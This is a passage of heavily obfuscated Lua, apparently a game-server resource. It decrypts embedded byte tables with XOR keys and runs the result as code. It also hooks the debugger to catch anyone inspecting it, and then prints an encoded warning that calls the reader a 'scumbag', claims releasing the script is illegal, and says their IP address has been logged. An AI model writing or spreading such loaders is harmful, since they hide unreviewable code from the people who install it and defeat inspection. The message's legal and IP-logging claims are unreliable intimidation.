                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB[bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('EC') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('FF') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('51') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('64')](t) then
                    ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB
                        [bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('EC') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('FF') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('51') .. bY5rBrivjjEZbiO8ib4wfsCDiCGEAwPIE6IMFJQj4rgWfaHxGAlDoekKh6C('64')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; j8KNWJ1c9pBw23bUFYqIfBLMKFtdIuHcxwyi1joerOAARoldfo8mlY1kkmhv4HWfHTNnlAncOP(
{ 1032, 799, 964, 672, 598, 730, 543, 1134, 920, 1022, 591, 879, 1203, 663, 566, 975, 1201, 582, 640, 686, 909, 626,
  1161, 1142, 891, 1071, 772, 621, 1023, 896, 1041, 762, 580, 709, 1198, 1131, 776, 831, 884, 956, 654, 809, 892, 1124,
  778, 736, 855, 716, 1138, 1202, 1020, 903, 852, 1070, 680, 666, 1197, 1033, 1130, 708, 601, 625, 712, 837, 771, 1113,
  744, 1122, 949, 1109, 664, 615, 1066, 693, 882, 982, 993, 887, 971, 871, 822, 1210, 947, 919, 913, 1158, 629, 583,
  1166, 760, 1073, 1092, 785, 624, 1060, 1209, 1195, 1099, 1080, 608, 1087, 1173, 677, 1179, 783, 798, 707, 738, 972,
  614, 1136, 1078, 766, 551, 1121, 846, 1181, 714, 1135, 720, 925, 1047, 1145, 791, 796, 1088, 727, 1077, 957, 1146, 811,
  717, 732, 698, 705, 725, 602, 675, 1128, 988, 1048, 678, 914, 1021, 843, 564, 593, 1155, 793, 1106, 876, 1150, 671,
  673, 1012, 962, 1177, 645, 553, 1169, 845, 1164, 1036, 1208, 1153, 1015, 1141, 767, 813, 802, 830, 1026, 935, 696, 792,
  951, 606, 906, 961, 1174, 1132, 825, 546, 782, 1120, 649, 1018, 933, 1205, 690, 549, 944, 1184, 617, 853, 1008, 747,
  622, 1129, 571, 731, 1171, 1065, 1011, 1058, 742, 834, 1133, 567, 1003, 777, 1156, 863, 986, 662, 1052, 907, 576, 768,
  858, 1050, 1108, 1188, 1104, 938, 703, 807, 788, 1157, 592, 1081, 775, 682, 1054, 611, 1016, 901, 1118, 659, 818, 992,
  763, 981, 550, 787, 967, 1091, 848, 1154, 642, 764, 718, 1042, 803, 755, 1094, 959, 1165, 581, 1074, 894, 932, 915,
  1084, 683, 734, 958, 995, 605, 1025, 974, 726, 934, 590, 634, 635, 1190, 781, 636, 952, 1102, 719, 1127, 1014, 829,
  965, 647, 908, 1027, 1175, 765, 688, 979, 997, 607, 998, 911, 558, 1163, 996, 877, 1199, 844, 770, 790, 699, 573, 966,
  1206, 604, 859, 984, 897, 1004, 650, 1147, 569, 814, 1144, 694, 1079, 721, 838, 597, 774, 556, 1105, 657, 989, 563,
  754, 756, 890, 751, 562, 800, 667, 701, 960, 1086, 862, 854, 613, 616, 912, 1182, 676, 1009, 827, 817, 735, 1093, 599,
  575, 880, 939, 1037, 594, 904, 1189, 980, 669, 702, 759, 823, 872, 623, 1076, 869, 1168, 916, 603, 704, 990, 808, 833,
  1183, 552, 769, 994, 941, 547, 637, 999, 923, 1039, 841, 752, 977, 905, 1001, 545, 1046, 810, 969, 670, 1140, 691, 724,
  1160, 1139, 1010, 1126, 1170, 873, 991, 753, 1082, 610, 805, 898, 710, 1123, 1061, 1055, 954, 1191, 1030, 711, 902,
  740, 1053, 630, 928, 868, 658, 922, 883, 936, 1110, 739, 1097, 745, 560, 1101, 743, 638, 857, 596, 795, 639, 685, 1038,
  1204, 840, 886, 945, 651, 921, 1200, 1143, 1069, 931, 548, 942, 1095, 835, 1098, 820, 713, 697, 899, 1162, 874, 888,
  695, 1187, 1096, 643, 824, 784, 832, 794, 828, 946, 1100, 646, 1045, 851, 1062, 728, 1114, 1211, 895, 748, 687, 1178,
  856, 1049, 665, 588, 1112, 729, 1089, 761, 628, 963, 568, 1017, 1159, 1152, 758, 1019, 544, 561, 723, 652, 937, 1057,
  1137, 618, 940, 927, 655, 847, 1040, 1006, 1005, 953, 885, 1186, 1196, 917, 574, 815, 595, 801, 929, 737, 1000, 555,
  950, 1193, 867, 644, 1044, 878, 585, 1024, 839, 689, 864, -1, 32, 83, 35, 80, 76, 10, 67, 91, 83, 22, 64, 63, 113, 68,
  190, 20, 225, 9, 20, 87, 76, 16, 176, 38, 79, 2, 55, 6, 75, 246, 3, 9, 89, 90, 162, 201, 57, 62, 39, 31, 0, 243, 69,
  83, 215, 87, 154, 68, 64, 54, 28, 86, 61, 24, 6, 41, 119, 13, 31, 126, 62, 43, 89, 75, 88, 60, 53, 31, 3, 242, 55, 63,
  18, 45, 69, 15, 220, 60, 56, 94, 71, 81, 29, 54, 231, 119, 19, 114, 140, 178, 82, 50, 31, 18, 87, 76, 33, 87, 61, 67,
  95, 119, 98, 86, 31, 29, 75, 19, 43, 74, 159, 119, 21, 171, 80, 83, 42, 105, 23, 96, 83, 24, 112, 15, 100, 50, 110, 48,
  67, 30, 105, 91, 20, 30, 42, 12, 109, 71, 245, 41, 97, 206, 18, 75, 2, 100, 2, 12, 20, 101, 111, 20, 55, 94, 3, 30, 31,
  170, 91, 39, 76, 86, 111, 251, 14, 95, 24, 126, 71, 83, 24, 95, 3, 60, 49, 67, 55, 13, 22, 120, 66, 2, 50, 1, 18, 74,
  100, 54, 70, 8, 147, 58, 74, 94, 81, 10, 52, 111, 45, 105, 75, 62, 10, 41, 111, 11, 152, 188, 112, 110, 26, 87, 0, 86,
  30, 20, 93, 14, 87, 43, 81, 65, 43, 19, 86, 20, 119, 15, 30, 30, 161, 15, 60, 86, 75, 21, 254, 30, 0, 101, 87, 78, 106,
  115, 22, 19, 66, 3, 81, 80, 95, 111, 42, 69, 234, 48, 7, 110, 126, 26, 31, 45, 94, 174, 39, 20, 89, 30, 125, 237, 77,
  45, 33, 21, 104, 40, 62, 11, 17, 29, 19, 126, 30, 95, 90, 121, 106, 112, 75, 102, 66, 118, 127, 65, 66, 85, 19, 71, 5,
  37, 54, 0, 104, 1, 3, 66, 219, 134, 20, 87, 88, 9, 75, 124, 51, 6, 54, 43, 225, 19, 124, 52, 239, 91, 26, 86, 111, 45,
  59, 50, 58, 106, 242, 75, 49, 73, 18, 78, 186, 80, 66, 96, 18, 31, 21, 21, 145, 76, 39, 78, 172, 5, 89, 68, 91, 78, 19,
  34, 23, 76, 75, 76, 87, 99, 11, 39, 76, 168, 20, 114, 114, 74, 9, 117, 71, 171, 54, 62, 59, 20, 10, 89, 78, 35, 95, 20,
  20, 238, 87, 62, 126, 31, 87, 74, 22, 78, 76, 8, 78, 11, 154, 84, 59, 114, 33, 50, 78, 54, 90, 5, 78, 86, 214, 22, 32,
  61, 4, 17, 79, 21, 2, 2, 66, 62, 10, 86, 111, 233, 7, 111, 227, 81, 12, 119, 40, 208, 112, 87, 5, 98, 0, 64, 117, 104,
  69, 83, 100, 83, 24, 39, 100, 89, 89, 22, 20, 93, 86, 52, 3, 80, 112, 119, 103, 18, 204, 5, 22, 22, 119, 104, 123, 58,
  84, 35, 43, 99, 86, 100, 70, 7, 9, 125, 0, 72, 88, 38, 141, 93, 118, 125, 56, 92, 209, 100, 87, 89, 63, 52, 58, 17, 45,
  94, 83, 2, 81, 93, 76, 5, 173, 19, 121, 122, 100, 245, 59, 91, 34, 73, 103, 66, 63, 236, 94, 9, 45, 168, 93, 34, 70,
  17, 6, 71, 4, 81, 32, 81, 30, 28, 24, 15, 157, 11, 239, 119, 13, 90, 18, 166, 30, 22, 22, 53, 68, 87, 22, 21, 81, 20,
  87, 67, 219, 89, 36, 13, 180, 60, 15, 22, 116, 110, 94, 22, 119, 16, 55, 62, 73, 94, 71, 10, 85, 15, 62, 80, 18, 0, 66,
  49, 16, 99, 1, 89, 39, 32, 22, 24, 76, 60, 7, 32, 17, 126, 95, 56, 9, 247, 43, 97, 137, 114, 90, 39, 31, 75, 30, 70,
  83, 22, 2, 30, 70, 108, 43, 81, 252, 126, 64, 81, 78, 147, 110, 127, 5, 189, 69, 19, 93, 46, 24, 64, 74, 24, 194, 87,
  48, 119, 112, 7, 24, 171, 77, 103, 87, 119, 61, 86, 12, 90, 11, 34, 56, 121, 97, 95, 59, 19, 64, 76, 119, 56 },
  "wWglOYR4vs4bj6WynlwvlPwND2"); fOQmhsaQQujssnscKVRFLEUkVx4SRuXX18vwt9OcQPRHKtYfpOHctG9poEB3qAQ =
ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB; eoqL8ycQ2kAlaWvtB6nHh2H0r5R6YsTso96IYxDgeuW7egitncY6Jn5yN0aCOltKOWnwbsuGf9 =
ew21jurPPIqbwCGtjZM5KDUCCAzjFwbtAsbl3TXeuAJPyqjAPtOhTvLOB; aYsHFEniAI87f8OSVtUQHqZRfODLEa2S0Mi35sK3xx247BUjeD7b5OsAw2taufwZ31BIZAu =
eoqL8ycQ2kAlaWvtB6nHh2H0r5R6YsTso96IYxDgeuW7egitncY6Jn5yN0aCOltKOWnwbsuGf9; y9baptoL6inelDFwnUVk4ZZQh9M3AtuvCSJdXL1MUjOR8t1UMCDiWJBhOnLTXyzqpqgEy =
aYsHFEniAI87f8OSVtUQHqZRfODLEa2S0Mi35sK3xx247BUjeD7b5OsAw2taufwZ31BIZAu; kRf9Dbs11My6jULhj5lnhgRcPAloboFLLP7vnHz9m6LjTqiOiqZJJnX =
y9baptoL6inelDFwnUVk4ZZQh9M3AtuvCSJdXL1MUjOR8t1UMCDiWJBhOnLTXyzqpqgEy; dAZOlv2meXsK2G8r9yd9VVYuELYRJdcC3LBQxZeXExkUCJkngt7QVygGeUD =
kRf9Dbs11My6jULhj5lnhgRcPAloboFLLP7vnHz9m6LjTqiOiqZJJnX; adVfzFZeRao5v4RRBqMqz7ZL00ew15bmYsLInuXWOe9MiC6i3gsA =
dAZOlv2meXsK2G8r9yd9VVYuELYRJdcC3LBQxZeXExkUCJkngt7QVygGeUD; vpke6cguWqyUVEKxaUV5uW5OpRhFAzapuKFqGHn1u5T97I0l7s1NayHfyz =
adVfzFZeRao5v4RRBqMqz7ZL00ew15bmYsLInuXWOe9MiC6i3gsA; vcZy9WIqd0vlmClmL6UsCcpFRTpFNK7Efik5hgFRo4tIiaQbyxOteWOZEIHbIqEa =
vpke6cguWqyUVEKxaUV5uW5OpRhFAzapuKFqGHn1u5T97I0l7s1NayHfyz; xXKPj9YtEr52XnnCoQwmEGJv8TVXaQkunkjGFLeUiZMP1eLE8qk9i3wH =
vcZy9WIqd0vlmClmL6UsCcpFRTpFNK7Efik5hgFRo4tIiaQbyxOteWOZEIHbIqEa; vDgwvxFBhetmbv1XX3mJ21mFunkECHsZ0EH6ViJd9aXE6uUELFjuXBDp =
xXKPj9YtEr52XnnCoQwmEGJv8TVXaQkunkjGFLeUiZMP1eLE8qk9i3wH; yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc =
vDgwvxFBhetmbv1XX3mJ21mFunkECHsZ0EH6ViJd9aXE6uUELFjuXBDp; xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp = function(
  a)
  K, F = 2573626330010341, 16384 + 9083; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; u9yezigONqi3A8kAxXgt5UN0Tb5IEaZjPsHnd9Mk9xfWku5c2kUMlx05ESi7jo7W0wtZ = function(b)
  co = coroutine.create(b)
  wetPeT0PJh1Ckvva2kvsDQJWaqc24GR3ok025MTC4QLBDmYWRD8F2czfXZ = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(wetPeT0PJh1Ckvva2kvsDQJWaqc24GR3ok025MTC4QLBDmYWRD8F2czfXZ, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return wetPeT0PJh1Ckvva2kvsDQJWaqc24GR3ok025MTC4QLBDmYWRD8F2czfXZ
end; xxqWa0TsKKnxa3dsuATrjm0BMLbyRDqalLBonvIZRojfenw0j3ueY6Wm5gxrSk18N67QlAnmNT = function(f, g)
  jvRusNsI6ij2J1eWCIVDxvJQVggvIi3PYMYwlo8RIJuV2WGn5MJHOHnIB = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; wApAlhTlu2990i3FXEOq2BSaoegjKu8rubBKm07vAv1HsjCSawI1IgTCc3HWU2d6Dj = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; o2QSmeLlKr8mxUrgCAta8418kKqp8qgNhj0ImbXJsitavs4LiEFoeG1YAke = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      jvRusNsI6ij2J1eWCIVDxvJQVggvIi3PYMYwlo8RIJuV2WGn5MJHOHnIB(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; obMWAoFAubrA14bw3YW4EbWZLtQHnfwvd7tGTvbLsPpbS4a5P5FRBAz5asJfDDurgwMRTLAV = function(p, n)
    dCOTDg30Jajmc0E35Zk7I15rzRCXvuxa5NZIRH9P1ELNTexEKGfACDdztTKXQz5vw3jIy0YD0 = ""
    for k, q in pairs(p) do dCOTDg30Jajmc0E35Zk7I15rzRCXvuxa5NZIRH9P1ELNTexEKGfACDdztTKXQz5vw3jIy0YD0 =
      dCOTDg30Jajmc0E35Zk7I15rzRCXvuxa5NZIRH9P1ELNTexEKGfACDdztTKXQz5vw3jIy0YD0 ..
      yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc
      [xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('6E') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('1B') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('C1') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('AC') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('0D') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('52')]
      [xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('9E') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('FF') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('44') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('C1')](
      q) end
    ; n(dCOTDg30Jajmc0E35Zk7I15rzRCXvuxa5NZIRH9P1ELNTexEKGfACDdztTKXQz5vw3jIy0YD0)
  end; wApAlhTlu2990i3FXEOq2BSaoegjKu8rubBKm07vAv1HsjCSawI1IgTCc3HWU2d6Dj(f,
    function(r) o2QSmeLlKr8mxUrgCAta8418kKqp8qgNhj0ImbXJsitavs4LiEFoeG1YAke(r, g,
        function(s) obMWAoFAubrA14bw3YW4EbWZLtQHnfwvd7tGTvbLsPpbS4a5P5FRBAz5asJfDDurgwMRTLAV(s,
            function(t) if #u9yezigONqi3A8kAxXgt5UN0Tb5IEaZjPsHnd9Mk9xfWku5c2kUMlx05ESi7jo7W0wtZ(yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc[xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('B3') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('BA') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('44') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('4B')]) == 1 then if yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc[xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('B3') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('BA') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('44') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('4B')] == yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc[xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('67') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('C1') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('AC') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('0D') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('1B')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc[xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('B3') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('BA') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('44') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('4B')](t) then
                    yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc
                        [xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('B3') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('BA') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('44') .. xCMctG747k2jcwv4vhBDqHS4qpB8agYj6h64AdKIx3E6YflceCIjNQjdjxVGJJhy7U2rAFp('4B')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; xxqWa0TsKKnxa3dsuATrjm0BMLbyRDqalLBonvIZRojfenw0j3ueY6Wm5gxrSk18N67QlAnmNT(
{ 1568, 2195, 2338, 3132, 3142, 3124, 1780, 3174, 2876, 2572, 2417, 2435, 2737, 1878, 1771, 3093, 1945, 1595, 2322, 3032,
  3181, 1555, 2739, 1588, 3136, 2100, 2182, 2341, 3036, 1996, 1616, 3170, 1914, 1926, 2751, 1537, 1576, 2779, 1652, 2445,
  2054, 2045, 2532, 3141, 1579, 3137, 2256, 2629, 1715, 3045, 1670, 2407, 2935, 3179, 2733, 3010, 2997, 1692, 2438, 2170,
  1854, 2046, 2647, 2469, 1583, 1801, 1954, 1719, 2165, 1901, 1754, 2036, 2108, 2384, 1777, 1940, 2131, 1832, 1952, 1697,
  1779, 2155, 2390, 1905, 2290, 1663, 2102, 1708, 2919, 2000, 2638, 2793, 1979, 1805, 2668, 1879, 3143, 2937, 2349, 2029,
  1581, 1938, 2253, 2646, 1976, 2743, 2973, 1753, 1977, 2251, 1812, 2979, 1649, 2578, 2612, 2375, 2870, 2681, 2164, 2813,
  2963, 1549, 2374, 3172, 2553, 1982, 1793, 2941, 2523, 1693, 2386, 1593, 2037, 2347, 2991, 2799, 2497, 2110, 2927, 2359,
  2383, 2146, 1965, 3090, 3165, 1628, 2796, 2373, 1557, 2010, 3163, 1930, 2025, 3058, 2340, 2528, 2970, 2273, 2042, 1585,
  2544, 1559, 1594, 2484, 2144, 1895, 2321, 1539, 2362, 3034, 2808, 2785, 1643, 2404, 2543, 2330, 1673, 2148, 2911, 1574,
  3122, 2956, 2659, 1917, 2726, 2802, 2938, 2957, 2223, 2788, 2356, 1828, 1731, 1896, 3000, 1566, 2550, 3184, 3112, 2651,
  1871, 2697, 2475, 2388, 1870, 1824, 2426, 2057, 3144, 2724, 2900, 1736, 3101, 2847, 1846, 2137, 1893, 1984, 1781, 2081,
  2660, 2027, 2582, 3164, 1980, 1727, 1880, 2194, 2731, 3066, 2439, 2539, 1876, 2190, 2776, 3080, 2368, 1989, 2468, 1772,
  2245, 2908, 1591, 2888, 1586, 2700, 2586, 1789, 2978, 2885, 3051, 1970, 2276, 1862, 2399, 2897, 2798, 1687, 2017, 2430,
  2588, 2944, 2841, 1987, 3104, 3097, 1743, 2129, 2014, 2556, 2003, 2632, 1810, 1785, 2285, 2350, 2395, 2716, 2971, 1572,
  3117, 1915, 1841, 1975, 2894, 2824, 2566, 2167, 2815, 2832, 2969, 3131, 2196, 1807, 3100, 1614, 1823, 2883, 1689, 2573,
  2047, 2063, 2044, 1884, 2215, 1918, 2402, 2595, 1694, 2506, 2520, 2757, 2581, 2452, 2804, 1610, 2768, 3005, 3118, 1726,
  2727, 2183, 3135, 2657, 1766, 1990, 1974, 1885, 2759, 2486, 2838, 2831, 1671, 2257, 3065, 2889, 2241, 2762, 1803, 3126,
  1961, 2232, 1834, 3157, 2149, 1999, 2187, 2609, 1622, 1949, 2372, 2443, 1540, 2672, 1849, 1947, 2736, 2094, 2239, 1544,
